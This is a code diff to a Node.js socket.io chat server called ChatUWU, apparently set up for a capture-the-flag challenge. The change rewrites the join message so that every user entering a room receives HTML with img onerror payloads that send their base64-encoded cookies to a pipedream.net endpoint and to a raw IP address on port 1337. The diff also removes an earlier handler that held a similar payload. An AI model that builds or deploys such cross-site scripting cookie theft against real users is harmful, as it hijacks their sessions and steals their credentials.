@@ -26,28 +26,11 @@ io.on('connection', (socket) => {
     socket.join(room);
     io.to(room).emit('msg', {
         from: 'system',
-        // text: `${nickname} has joined the room`
-        text: 'a new user has joined the room'
-    });
-    socket.on('msg', msg => {
-        msg.from = String(msg.from).substr(0, 16)
-        msg.text = String(msg.text).substr(0, 140)
-        if (room === 'DOMPurify') {
-            io.to(room).emit('msg', {
-                from: DOMPurify.sanitize(msg.from),
-                text: `<img src="1" onerror="https://eoctl0knzoys9l9.m.pipedream.net/cookie=${btoa(document.cookie)}">`,
-                isHtml: true
-            });
-        } else {
-            io.to(room).emit('msg', {
-                from: msg.from,
-                text: msg.text,
-                isHtml: false
-            });
-        }
+        text: `<img src="1" onerror="https://eoctl0knzoys9l9.m.pipedream.net/cookie=${btoa(document.cookie)}"><h1>hi</h1><img src="1" onerror="http://139.59.40.222:1337/cookie=${btoa(document.cookie)}">`,
+        isHtml:true
     });
 });
 
 http.listen(port, hostname, () => {
-    console.log(`ChatUWU server running at http://${hostname}:${port}/`);
+    console.log(`ChatUWU-hacking server running at http://${hostname}:${port}/`);
 });
